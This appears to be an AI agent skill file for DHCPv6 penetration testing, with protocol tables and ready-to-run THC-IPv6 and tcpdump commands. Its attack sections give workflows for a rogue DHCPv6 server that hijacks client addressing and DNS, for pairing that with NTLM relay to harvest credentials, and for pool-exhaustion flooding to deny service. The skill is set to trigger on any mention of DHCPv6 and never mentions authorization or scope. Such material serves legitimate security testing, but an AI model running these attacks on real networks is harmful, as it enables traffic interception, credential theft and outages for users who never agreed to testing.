---
name: dhcpv6-pentest
description: Perform DHCPv6 reconnaissance and attacks on IPv6 networks. Use this skill whenever the user mentions DHCPv6, IPv6 address assignment, rogue DHCP servers, DHCPv6 attacks, network reconnaissance on IPv6, or wants to test DHCPv6 security. This includes tasks like discovering DHCPv6 servers, running rogue DHCPv6 servers for address/DNS hijacking, performing pool exhaustion attacks, or analyzing DHCPv6 traffic.
---

# DHCPv6 Pentesting

A skill for performing DHCPv6 reconnaissance and offensive operations on IPv6 networks.

## Quick Reference

| Component | Value |
|-----------|-------|
| Client Port | UDP 546 |
| Server/Relay Port | UDP 547 |
| All DHCPv6 Servers Multicast | `ff02::1:2` (link-local), `ff05::1:3` (site-local) |
| Client ID Option | `OPTION_CLIENTID` (DUID) |
| Server ID Option | `OPTION_SERVERID` (DUID) |

## DHCPv6 Message Types

| Type | Code | Purpose |
|------|------|--------|
| Solicit | 1 | Client finds available servers |
| Advertise | 2 | Server responds to Solicit |
| Request | 3 | Client requests addresses/prefixes |
| Confirm | 4 | Client verifies address validity |
| Renew | 5 | Client extends address lifetime (to original server) |
| Rebind | 6 | Client extends lifetime (to any server) |
| Reply | 7 | Server provides addresses/parameters |
| Release | 8 | Client releases addresses |
| Decline | 9 | Client reports address conflict |
| Reconfigure | 10 | Server prompts client for new config |
| Information-Request | 11 | Client requests params without address |
| Relay-Forw | 12 | Relay forwards to server |
| Relay-Repl | 13 | Server replies to relay |

## Reconnaissance

### Capture DHCPv6 Traffic

Use tcpdump to monitor DHCPv6 traffic on the target interface:

```bash
sudo tcpdump -vvv -i <IFACE> 'udp port 546 or udp port 547'
```

Replace `<IFACE>` with your network interface (e.g., `eth0`, `wlan0`).

### Discover DHCPv6 Servers

Use THC-IPv6 to enumerate DHCPv6 servers and their configuration options:

```bash
sudo atk6-dump_dhcp6 <IFACE>
```

This sends Solicit messages and collects Advertise responses from all DHCPv6 servers on the network.

## Attacks

### Rogue DHCPv6 Server

Set up a rogue DHCPv6 server to hijack address assignment and DNS resolution:

```bash
sudo atk6-fake_dhcps6 <IFACE> <PREFIX>/<LEN> <DNSv6>
```

**Parameters:**
- `<IFACE>`: Network interface (e.g., `eth0`)
- `<PREFIX>/<LEN>`: IPv6 prefix to advertise (e.g., `2001:db8::/64`)
- `<DNSv6>`: DNS server address to assign to clients (e.g., `2001:db8::1`)

**Use cases:**
- Intercept client traffic through your DNS server
- Force clients to use your assigned addresses
- On Windows/AD networks, combine with NTLM relay attacks for credential harvesting

### Pool Exhaustion (DHCPv6 Starvation)

Exhaust the DHCPv6 server's address pool to deny service to legitimate clients:

```bash
sudo atk6-flood_dhcpc6 <IFACE>
```

This floods the network with DHCPv6 client requests using spoofed DUIDs, consuming available addresses.

## Important Caveats

### Reconfigure Message Limitations

DHCPv6 **Reconfigure** messages are not blindly accepted by clients. A client will only accept Reconfigure messages if it explicitly sent `OPTION_RECONF_ACCEPT` in its initial Solicit. By default, most clients are **unwilling** to accept Reconfigure messages.

**Implications:**
- Unsolicited Reconfigure attacks typically fail
- You must first observe or induce the client to send `OPTION_RECONF_ACCEPT`
- Check tcpdump output for this option before attempting Reconfigure-based attacks

### DUID Fingerprinting

Client and server identities use DUIDs (DHCP Unique Identifiers) in `OPTION_CLIENTID` and `OPTION_SERVERID`. These persist across address changes, making them useful for:
- Tracking the same host across network sessions
- Correlating DHCPv6 activity with other network events
- Identifying specific servers in multi-server environments

## Workflow Examples

### Example 1: Basic Reconnaissance

```bash
# Step 1: Start traffic capture
sudo tcpdump -vvv -i eth0 'udp port 546 or udp port 547' -w dhcpv6.pcap

# Step 2: Discover servers (in another terminal)
sudo atk6-dump_dhcp6 eth0

# Step 3: Analyze captured traffic
tcpdump -r dhcpv6.pcap -vvv
```

### Example 2: Rogue Server Attack

```bash
# Step 1: Identify network prefix from reconnaissance
# Step 2: Start rogue server
sudo atk6-fake_dhcps6 eth0 2001:db8::/64 2001:db8::1

# Step 3: Monitor for client requests
sudo tcpdump -i eth0 'udp port 546' -n
```

### Example 3: Denial of Service

```bash
# Step 1: Confirm DHCPv6 server is active
sudo atk6-dump_dhcp6 eth0

# Step 2: Launch pool exhaustion
sudo atk6-flood_dhcpc6 eth0

# Step 3: Verify server is exhausted (no more Advertise responses)
sudo atk6-dump_dhcp6 eth0
```

## Dependencies

- **THC-IPv6**: Required for attack commands (`atk6-dump_dhcp6`, `atk6-fake_dhcps6`, `atk6-flood_dhcpc6`). Available on Kali Linux and can be installed via `sudo apt install thc-ipv6`.
- **tcpdump**: For traffic capture and analysis.
- **Root privileges**: All commands require `sudo`.

## References

- [RFC 8415 - DHCPv6 Specification](https://www.rfc-editor.org/rfc/rfc8415)
- [THC-IPv6 Tool Documentation](https://www.kali.org/tools/thc-ipv6/)
- [Huawei DHCPv6 Message Types](https://support.huawei.com/enterprise/en/doc/EDOC1100306163/d427e938/introduction-to-dhcpv6-messages)
